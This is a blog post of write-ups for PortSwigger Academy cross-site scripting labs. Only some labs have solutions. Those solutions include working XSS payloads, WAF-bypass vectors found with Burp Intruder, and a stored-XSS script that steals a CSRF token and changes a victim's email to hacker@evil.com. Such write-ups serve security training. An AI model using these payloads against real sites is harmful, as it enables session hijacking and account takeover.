---
title: Burp Certified Practioner - XSS Labs (30/30)
date: 2021-10-27
categories:
  - "Web 2.0 Security"
---

In this post, we will go over my solutions to all cross-site scripting labs available in [Burp Academy](https://portswigger.net/web-security/cross-site-scripting). 

🧵⬇️

### Table of Content <!-- omit in toc -->

- [Lab 01 - Reflected XSS into HTML context with nothing encoded](#lab-01---reflected-xss-into-html-context-with-nothing-encoded)
- [Lab 02 - Stored XSS into HTML context with nothing encoded](#lab-02---stored-xss-into-html-context-with-nothing-encoded)
- [Lab 03 - DOM XSS in document.write sink using source location.search](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch)
- [Lab 04 - DOM XSS in document.write sink using source location.search inside a select element](#lab-04---dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element)
- [Lab 05 - DOM XSS in innerHTML sink using source location.search](#lab-05---dom-xss-in-innerhtml-sink-using-source-locationsearch)
- [Lab 06 - DOM XSS in jQuery anchor href attribute sink using location.search source](#lab-06---dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source)
- [Lab 07 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#lab-07---dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Lab 08 - Reflected DOM XSS](#lab-08---reflected-dom-xss)
- [Lab 09 - Stored DOM XSS](#lab-09---stored-dom-xss)
- [Lab 10 - Exploiting cross-site scripting to steal cookies](#lab-10---exploiting-cross-site-scripting-to-steal-cookies)
- [Lab 11 - Exploiting cross-site scripting to capture passwords](#lab-11---exploiting-cross-site-scripting-to-capture-passwords)
- [Lab 12 - Exploiting stored XSS to perform CSRF](#lab-12---exploiting-stored-xss-to-perform-csrf)
- [Lab 13 - Reflected XSS into HTML context with most tags and attributes blocked](#lab-13---reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
- [Lab 14 - Reflected XSS into HTML context with all tags blocked except custom ones](#lab-14---reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
- [Lab 15 - Reflected XSS with event handlers and href attributes blocked](#lab-15---reflected-xss-with-event-handlers-and-href-attributes-blocked)
- [Lab 16 - Reflected XSS with some SVG markup allowed](#lab-16---reflected-xss-with-some-svg-markup-allowed)
- [Lab 17 - Reflected XSS into attribute with angle brackets HTML-encoded](#lab-17---reflected-xss-into-attribute-with-angle-brackets-html-encoded)
- [Lab 18 - Stored XSS into anchor href attribute with double quotes HTML-encoded](#lab-18---stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)
- [Lab 19 - Reflected XSS in canonical link tag](#lab-19---reflected-xss-in-canonical-link-tag)
- [Lab 20 - Reflected XSS into a JavaScript string with single quote and backslash escaped](#lab-20---reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
- [Lab 21 - Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab-21---reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [Lab 22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#lab-22---reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [Lab 23 - Reflected XSS in a JavaScript URL with some characters blocked](#lab-23---reflected-xss-in-a-javascript-url-with-some-characters-blocked)
- [Lab 24 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#lab-24---stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
- [Lab 25 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#lab-25---reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
- [Lab 26 - Reflected XSS with AngularJS sandbox escape without strings](#lab-26---reflected-xss-with-angularjs-sandbox-escape-without-strings)
- [Lab 27 - Reflected XSS with AngularJS sandbox escape and CSP](#lab-27---reflected-xss-with-angularjs-sandbox-escape-and-csp)
- [Lab 28 - Reflected XSS protected by CSP, with dangling markup attack](#lab-28---reflected-xss-protected-by-csp-with-dangling-markup-attack)
- [Lab 29 - Reflected XSS protected by very strict CSP, with dangling markup attack](#lab-29---reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
- [Lab 30 - Reflected XSS protected by CSP, with CSP bypass](#lab-30---reflected-xss-protected-by-csp-with-csp-bypass)

### Lab 01 - Reflected XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

The user input in search bar is reflected in the page without any encoding. This is the simplest case of rXSS

**Solution**

```
<svg/onload=alert(1)>
```

### Lab 02 - Stored XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

### Lab 03 - DOM XSS in document.write sink using source location.search

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

### Lab 04 - DOM XSS in document.write sink using source location.search inside a select element

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

### Lab 05 - DOM XSS in innerHTML sink using source location.search

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

### Lab 06 - DOM XSS in jQuery anchor href attribute sink using location.search source

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

### Lab 07 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

### Lab 08 - Reflected DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

### Lab 09 - Stored DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

### Lab 10 - Exploiting cross-site scripting to steal cookies

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

### Lab 11 - Exploiting cross-site scripting to capture passwords

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

### Lab 12 - Exploiting stored XSS to perform CSRF

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

In this lab we see how we can leverage a **stored XSS** to perform a **CSRF** attack on a victim. We are targetting the `/change-email` functionnality to forcefully change the victim's e-mail address to something under our control.

The web application uses anti-CSRF tokens to prevent such kinds of attacks, but we can extract it by leveraging a stored XSS located in the blog comments.

1) Victim requests the page containing the anti-CSRF token we want to extract (`/my-account`). The browser will automatically pass-on the user's cookies (`allowCredentials=true`)

2) A second request is sent to modify the email address which will append both the session cookies and the `csrf` token extracted in step 1)

**Solution**

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open("get", "/my-account", true);
req.send();
function handleResponse() {
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	var changeReq = new XMLHttpRequest();
	changeReq.open("post", "/my-account/change-email", true);
	changeReq.send("csrf="+token+"&email=hacker@evil.com");
};
</script>
```

### Lab 13 - Reflected XSS into HTML context with most tags and attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads.

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 20

"Tag is not allowed"
```

We use Burp Intruder to check against a pre-compiled list of HTML tags to see what is blacklisted:

`GET /?search=<§§>` in Intruder

`<body(...)>` seems to pass the blacklist and is a known XSS vector

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 26

"Attribute is not allowed"
```

Now we need to do the same for attributes:

`GET /?search=<body §§>` in Intruder where `§§` is our injection point.

`onresize` seems to be accepted and can be combined with `body` to create a payload:

```
<body onresize="alert(1)">
```

All there is left to do is deliver the payload to the victim. It has to be interaction-free to pass the lab.

The user will load an iframe containing our rXSS payload which we will then proceed to trigger the `onresize` event by changing its style.

`<iframe src={lab instance url}/?search={URL encoded payload} onload=this.style.width='100px'>`

**Solution**

```
<iframe src=https://ac1d1f931e6c53d0c0024e0200d10019.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E onload=this.style.width='100px'>
```

### Lab 14 - Reflected XSS into HTML context with all tags blocked except custom ones

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

Similar to previous lab except only **custom tags** are allowed.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocus

We can trigger a XSS with the **onfocus(in|out)** event handler.

Once again, we deliver it our payload to the victim with an **iframe** that will execute Javascript to focus on the `<div>` upon loading.

```
<iframe src={lab instance url}/?search={URL encoded payload}#xss>
```

Payload:

```
<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>
```

**Solution**

```
<iframe src=https://ac6b1f4c1ea25374c01b644300f600bc.web-security-academy.net/?search=<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>#xss>
```

### Lab 15 - Reflected XSS with event handlers and href attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads. On top of that, all event handlers are blacklisted.

It is **still possible** to trigger XSS without the use of **event tags**. Generally, the technique relies on using anchor tags `<a>` in combination with the `href` attribute. Here `href` **as an attribute** is blocked. However, we can trick the WAF by embedding it inside a `<animate>` **svg** tag.

The WAF will not consider `href` as an attribute and allow the request to go through, however, the victim's browser will parse `href` as if it was an attribute and execute the `javascript:...` payload passed in `values` .

Read https://blog.isec.pl/xss-fun-with-animated-svg/ for more details about this technique

**Solution**

*Note: we need to label our vector with the word "Click" in order to induce the simulated lab user to perform a click action.*

```
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click Me</text></a></svg>
```

### Lab 16 - Reflected XSS with some SVG markup allowed

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

User input in the search bar is reflected on the page but there is a WAF protecting the application against common XSS payloads.

We are permitted to use `<svg>` tags which is a common XSS vector.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg

**Solution**
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### Lab 17 - Reflected XSS into attribute with angle brackets HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

### Lab 18 - Stored XSS into anchor href attribute with double quotes HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

### Lab 19 - Reflected XSS in canonical link tag

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

This lab reflects user input in a [canonical link](https://en.wikipedia.org/wiki/Canonical_link_element#:~:text=A%20canonical%20link%20element%20is,went%20live%20in%20April%202012.) tag and escapes angle brackets.

It is possible to induce a user into triggering XSS payloads in **unexploitable** tags such as : `input hidden`, `link`, `canonical` by using the `accesskey` attribute.

This requires **user interaction**, as the victim needs to press the required key to fire the payload.

Example:

`<input type="hidden" accesskey="X" onclick="alert(1)">`

**Solution**

On macOS, `CTRL+OPTION+X` will trigger the `onclick` event

```
https://<burp_instance_url>/?%27onclick=%27alert(1)%27accesskey=%27X
```

### Lab 20 - Reflected XSS into a JavaScript string with single quote and backslash escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

### Lab 21 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

### Lab 22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

### Lab 23 - Reflected XSS in a JavaScript URL with some characters blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

### Lab 24 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

### Lab 25 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

### Lab 26 - Reflected XSS with AngularJS sandbox escape without strings

https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings

### Lab 27 - Reflected XSS with AngularJS sandbox escape and CSP

https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp

### Lab 28 - Reflected XSS protected by CSP, with dangling markup attack

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack

### Lab 29 - Reflected XSS protected by very strict CSP, with dangling markup attack

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

### Lab 30 - Reflected XSS protected by CSP, with CSP bypass

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
